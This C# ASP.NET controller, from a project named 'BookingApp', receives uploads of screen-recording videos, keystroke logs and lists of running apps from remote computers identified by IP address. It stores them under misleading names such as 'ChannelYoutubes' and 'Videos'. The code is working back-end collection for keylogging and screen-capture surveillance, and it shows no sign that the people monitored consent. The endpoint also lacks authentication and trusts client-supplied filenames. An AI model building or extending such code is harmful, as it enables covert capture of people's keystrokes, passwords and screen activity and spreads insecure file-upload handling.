﻿using BookingApp.DB.Classes.DB;
using Microsoft.AspNetCore.Http;
using Microsoft.AspNetCore.Mvc;
using Microsoft.AspNetCore.Routing.Constraints;
using Microsoft.Extensions.Hosting;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Linq.Dynamic.Core;
using System.Threading.Tasks;

// For more information on enabling Web API for empty projects, visit https://go.microsoft.com/fwlink/?LinkID=397860

namespace BookingApp.Controllers
{
    [Route("api/[controller]/[action]")]
    [ApiController]
    public class UploadController : ControllerBase
    {
        private readonly IHostEnvironment _env;
        public UploadController(IHostEnvironment env)
        {
            _env = env;
        }
        public class VideoDto
        {
            public IFormFile Video { set; get; }
            public string ip { set; get; }
            public string keylog { set; get; }
            public string apps { set; get; }
        }
        [HttpPost]
        public async Task<IActionResult> UploadVideos([FromForm] VideoDto video)
        {
            using var db = new AppDbContext();
            var computers = db.ChannelYoutubes.ToList();
            var com = computers.Where(x => x.Link.Contains(video.ip)).FirstOrDefault();
            // Split the Video path using the backslash ('\') character as the separator
            string[] VideoPathParts = video.Video.FileName.Split('\\');
            // Extract the Videoname without the extension (assuming the last part is the Videoname)
            string VideoNameWithoutExtension = VideoPathParts[VideoPathParts.Length - 1];

            string name = VideoNameWithoutExtension.Split(".")[0];
            string VideoName = name + "_"+com.Id + ".mp4"; 

            string VideoPath = Path.Combine(_env.ContentRootPath, "file", VideoName); // Or use your preferred storage location
            using (var stream = new FileStream(VideoPath, FileMode.Create))
            {
                await video.Video.CopyToAsync(stream);
            }
            DateTime from = convert(long.Parse(name.Split("_")[0]));
            DateTime to = convert(long.Parse(name.Split("_")[1]));

            db.Add(new Videos() 
            { 
                VideoPath = Path.Combine("Video", VideoName),
                Keylog = video.keylog, 
                Apps = video.apps, 
                ChannelId = com.Id, 
                CreatedDate = DateTime.Now,
                Year = from.Year,
                Month = from.Month,
                Date = from.Day,
                Hours = from.Hour,
                Minutes = from.Minute,
                Start = from,
                End = to,
                IsDelete = false
            });


            db.SaveChanges();

            return Ok("Videos uploaded successfully");
        }
        private DateTime convert (long ticks)
        {
            var when = new DateTime(1970, 1, 1).AddSeconds(ticks);

            // Convert the UTC DateTime to the local time zone (Hanoi, Vietnam)
            DateTime localDateTime = when.ToLocalTime();
            return localDateTime;
        }
    }
}
